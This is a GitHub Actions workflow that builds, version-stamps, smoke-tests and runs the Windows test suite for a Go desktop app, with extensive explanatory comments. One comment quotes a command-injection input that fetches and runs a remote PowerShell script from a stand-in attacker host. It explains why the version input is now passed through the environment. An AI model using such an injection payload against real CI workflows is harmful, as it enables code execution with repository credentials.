# Builds the native-window (webview) build of localcode on Windows.
#
# This lives in CI, not the Makefile, on purpose: the GUI links a native
# WebView2 through CGo, which cannot be cross-compiled from the macOS box
# the pure-Go release artifacts are built on. A real Windows runner is the
# only place this binary can be produced and smoke-tested.
#
# The artifact it uploads is the bare localcode-gui.exe. Running it needs
# the WebView2 runtime, which ships with Windows 11 and recent Windows 10;
# older systems install it once from Microsoft's Evergreen bootstrapper.
# Bundling that into the MSI is a separate step, deliberately deferred
# until this build is confirmed green and testable on a real Windows box.
name: gui-windows

on:
  push:
    branches: [main]
    paths:
      - 'cmd/**'
      - 'internal/**'
      - 'go.mod'
      - 'go.sum'
      - '.github/workflows/gui-windows.yml'
  workflow_dispatch:
    inputs:
      version:
        description: 'Version to stamp into the binary (e.g. 0.32.2). Leave blank to derive it from the nearest tag.'
        required: false
        type: string

# Only what the job needs: check out the tree and upload an artifact.
# Without this block the job inherits the repository default, which on a
# repo that never changed it is write-all — so any mistake in a step
# below runs with a token that can push.
permissions:
  contents: read

jobs:
  build:
    runs-on: windows-latest
    # A bound on the job, because this one had none and the default is
    # six hours. On 2026-09-22 the test step below, which takes about
    # 75 seconds, sat for 38 minutes until it was cancelled by hand; the
    # re-run passed in two. Nothing was going to stop it, and because
    # the attempt had to be force-cancelled its log was not kept, so
    # which test hung is not known. Normal is about two minutes end to
    # end, so this is roughly seven times that: long enough never to
    # fire on a slow runner, short enough to be a bound.
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4
        with:
          # Full history so `git describe` can see the tags — a shallow
          # clone has none, and the version below would fall all the way
          # back to a bare commit hash.
          fetch-depth: 0

      # Without this the GUI build was the one artifact in the release that
      # carried no version at all: every other binary is built by the
      # Makefile/package scripts, which pass -X main.version, but this one
      # is built here and used to link the compiled-in default, "dev". The
      # visible symptom was the GUI header reading "vdev" — and `localcode
      # version` on the desktop build reporting "dev" — while the console
      # binary beside it from the same MSI reported the real number.
      #
      # The release flow packages the MSI *before* the tag exists (see
      # RELEASING.md), so an automatic version would be one commit past
      # the previous tag rather than the number on the box. Hence the
      # dispatch input: a release run is told its version explicitly.
      # Everything else falls back to git describe, which on a tagged
      # commit is that tag and otherwise is the last tag plus the
      # distance past it — the honest answer for a build off main.
      #
      # The input arrives through the environment rather than through
      # ${{ }}. Expression substitution is textual and happens before bash
      # parses the line, so an input of
      #     '; curl -s https://attacker/x.ps1 | iex; echo '
      # closed the quote and ran as commands on the runner — with the
      # job's token, and on the tree that produces the released
      # localcode-gui.exe. Dispatch needs write access, so it was
      # escalation from write-to-repo rather than anonymous RCE, but the
      # environment removes the substitution step entirely.
      - name: Resolve version
        shell: bash
        env:
          LC_INPUT_VERSION: ${{ inputs.version }}
        run: |
          v="$LC_INPUT_VERSION"
          [ -n "$v" ] || v="$(git describe --tags --always | sed 's/^v//')"
          echo "resolved version: $v"
          echo "LC_VERSION=$v" >> "$GITHUB_ENV"

      - uses: actions/setup-go@v5
        with:
          go-version: '1.26.x'

      # CGo needs a C compiler. The windows-latest image ships MinGW-w64;
      # print it so a failure here is obvious in the log rather than a
      # confusing linker error later.
      - name: Show C toolchain
        run: gcc --version

      # -H windowsgui makes this a GUI-subsystem binary: launched from cmd
      # or Explorer it opens its window and hands the shell prompt straight
      # back, instead of pinning the console for the window's whole
      # lifetime (and, from Explorer, flashing an empty console box).
      #
      # The trade-off is that a GUI-subsystem process has no console of its
      # own, so console-only subcommands (`version`, `mcp`, `login`) print
      # nowhere useful from this binary — those belong to the regular
      # console-subsystem localcode.exe, which ships in the same MSI.

      # The packages with Windows-only code paths, run on Windows. The
      # handoff test in cmd/localcode starts this test binary as a
      # successor with inherited handles, which no other platform can
      # stand in for; the update package's rename-and-replace is the
      # same story. Nothing here needs CGo.
      # The three directory-resolution packages run whole: what decides
      # where skills, commands and rules are read from is a chain of
      # path joins, and "the same on Windows" is a claim that has to be
      # executed on Windows rather than reasoned about from filepath's
      # documentation.
      #
      # The filter is gone from internal/daemon and internal/session, and
      # the three reasons it was there are fixed rather than worked
      # around: every test that builds a store now closes it, so a
      # temporary directory holding open log files can be removed; the
      # tool arguments in the end-to-end test are marshalled twice
      # instead of hand-escaped once, which is what left a Windows path
      # as `\U` inside a JSON string; and the tests that isolate HOME
      # now set USERPROFILE beside it, which is what os.UserHomeDir
      # actually reads there. See docs/IMPROVEMENTS.md item 41.
      #
      # cmd/localcode runs whole too now, by the same three fixes: every
      # test that isolates HOME sets USERPROFILE beside it, Windows paths
      # are marshalled into JSON rather than pasted into it, and the
      # one-shot run closes its session store so t.TempDir() can be
      # removed. The binary-building test names its .exe, and the one
      # test that cannot run here is tagged out of the build itself
      # (restart_unix_test.go is !windows) rather than filtered.
      #
      # An inclusion filter is the wrong shape for this even when it is
      # green: a test added tomorrow does not run on Windows and nobody
      # is told. A guard test in cmd/localcode holds this line whole.
      #
      # shell: bash, and that line is the one carrying weight. Without
      # it this step runs under PowerShell, where a multi-line `run:`
      # reports only the last command's exit code — so every `go test`
      # but the last could fail and the step still passed. It did: a run
      # with 27 failing tests in internal/session was reported green,
      # and the only reason anybody saw them was reading the log. Under
      # bash, Actions sets `-e`, and the first failure ends the step.
      #
      # -timeout on every invocation, because the job timeout above is a
      # bound and not a diagnosis: it kills the runner and says nothing
      # about why. `go test` reaching its own timeout panics and prints
      # every goroutine's stack, which names the test that hung. These
      # four commands take about 20 seconds each, so six minutes is the
      # answer to "this is not running any more" rather than a limit any
      # honest run could reach. Go's own default is ten minutes per
      # package, which is both looser and silent about being a default.
      - name: Test the Windows code paths
        shell: bash
        # The step bound is the one that would have caught the incident.
        # `go test -timeout` bounds the test binary's own run and nothing
        # else, so a stalled module download, a slow link, or Defender
        # scanning eight freshly written .exe files sits outside it. This
        # step measures about 75 seconds.
        timeout-minutes: 10
        run: |
          go test -timeout 5m ./internal/update/ ./internal/childproc/
          go test -timeout 5m ./internal/userdirs/ ./internal/skills/ ./internal/rules/
          go test -timeout 5m ./internal/session/ ./internal/daemon/
          go test -timeout 5m ./cmd/localcode/
        env:
          CGO_ENABLED: '0'

      - name: Build GUI (-tags gui, CGo)
        env:
          CGO_ENABLED: '1'
        run: go build -tags gui -ldflags "-s -w -H windowsgui -X main.version=$env:LC_VERSION" -o localcode-gui.exe ./cmd/localcode

      # Proves the CGo binary actually links and runs on Windows. Because
      # the binary is GUI-subsystem, PowerShell does not wait for it and its
      # stdout goes nowhere — Start-Process -Wait is what makes the exit
      # code observable, so a link error or an instant crash still fails CI.
      # `version` exits immediately without opening a window or reading a
      # config, so this stays headless.
      - name: Smoke check
        run: |
          $p = Start-Process -FilePath ./localcode-gui.exe -ArgumentList 'version' -Wait -PassThru -NoNewWindow -RedirectStandardOutput ver.txt
          if ($p.ExitCode -ne 0) { throw "localcode-gui.exe version exited $($p.ExitCode)" }
          # Also the guard against shipping an unstamped binary again: an
          # exe that reports "dev" builds and runs perfectly and is wrong
          # in the only way a user ever sees, in the GUI header.
          $v = (Get-Content ver.txt -Raw).Trim()
          Write-Host "reported version: $v"
          if ($v -eq 'dev' -or $v -eq '') { throw "localcode-gui.exe was not version-stamped (reported '$v')" }

      - uses: actions/upload-artifact@v4
        with:
          name: localcode-gui-windows-amd64
          path: localcode-gui.exe
          if-no-files-found: error

  # Every package with tests, on Windows, in a job of its own.
  #
  # Separate from `build` on purpose. The build job produces the GUI
  # artifact a release needs, and this one is bringing twenty-four
  # packages onto Windows for the first time — internal/agent alone has
  # seventy-nine test files and not one GOOS guard. Red here must be
  # visible without also blocking the artifact, and it must be red rather
  # than filtered down to what already passes: a -run filter that hides
  # the failures is the same thing as not running them.
  #
  # The path this is walking was measured before it was started: the last
  # widening turned up 52 failures, none in the code under test, and three
  # causes accounted for nearly all of them — a store holding a file
  # Windows will not let t.TempDir() delete, a native path pasted into
  # JSON unescaped, and HOME isolated without USERPROFILE beside it.
  test-windows:
    runs-on: windows-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with:
          go-version: '1.26.x'
          cache: true
      - uses: actions/setup-node@v4
        with:
          node-version: '22'
      # go vet is platform-aware through build tags: it compiles the
      # Windows files (handoff_windows.go, listen_windows.go, ...) that
      # the ubuntu/macOS gate never sees, so a Windows-only type error
      # has nowhere else to surface. gofmt and the doc-link check are
      # platform-independent and already run in the gate; repeating them
      # here would only duplicate it.
      - name: Vet every package
        shell: bash
        run: go vet ./...
        env:
          CGO_ENABLED: '0'
      # shell: bash for the reason written in the build job: a multi-line
      # `run:` under PowerShell reports only the last command's status.
      - name: Test every package
        shell: bash
        timeout-minutes: 10
        run: go test ./... -count=1 -timeout 5m
        env:
          CGO_ENABLED: '0'
